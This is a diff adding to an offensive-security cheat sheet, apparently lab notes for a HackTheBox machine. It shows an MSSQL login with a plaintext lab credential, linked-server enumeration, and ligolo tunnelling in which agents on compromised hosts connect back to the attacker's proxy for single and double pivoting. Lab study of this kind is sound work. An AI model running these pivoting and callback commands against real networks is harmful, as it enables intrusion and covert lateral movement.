@@ -1014,6 +1014,25 @@ use auxiliary/admin/mssql/mssql_enum_domain_accounts
 
 Database enumeration https://juggernaut-sec.com/mssql/[here]
 
+After database connection
+
+```bash
+impacket-mssqlclient 'darkzero.htb'/'john.w':'RFulUtONCOL!'@10.129.10.126 -windows-auth
+```
+
+We can enum a domain forest and users
+
+```bash
+enum_links
+```
+
+If we use anouther link there can be anouther configurations 
+
+```bash
+use_link "DC02.darkzero.ext"
+```
+
+
 [[forwarding]]
 == Port-Forwarding and Sliver C2
 
@@ -1092,6 +1111,56 @@ In target machine where port `8004` it's in which port tunnel in local machine a
 
 ```bash
 ./chisel.exe client 10.10.10.10:8001 R:8004:127.0.0.1:8000
+```
+
+Tunneling also can be done by `ligolo`
+
+```bash
+sudo ligolo-proxy -selfcert -laddr 'my_ip:5050'
+```
+
+There is agents for Windows and Linux so after agent transfering to target host we can connect back to our proxy
+
+```bash
+./agent -connect my_ip:5050 -ignore-cert -retry
+```
+
+Then choose current session and type
+
+```bash
+autoroute
+```
+
+For double pivoting start listener in obtained host in which running tunneling
+
+```bash
+listener_add --addr agent_listening_address:port--to [local_listening_address:port] --tcp
+```
+
+Then transfer agent to second target machine and connect back to target one listener
+
+```bash
+./agent -connect agent_listening_address:port -ignore-cert -retry
+```
+
+It connects back and you don't need `autoroute` again just use an existing interface created in target one if you need to add some new ip ranges use
+
+EXP
+
+```bash
+sudo ip route add 192.168.100.0/24 dev romanticbutterc
+```
+
+List your routes 
+
+```bash
+sudo ip route list
+```
+
+Delete route and interface
+
+```bash
+sudo ip link delete romanticbutterc
 ```
 
 [[ssh]]
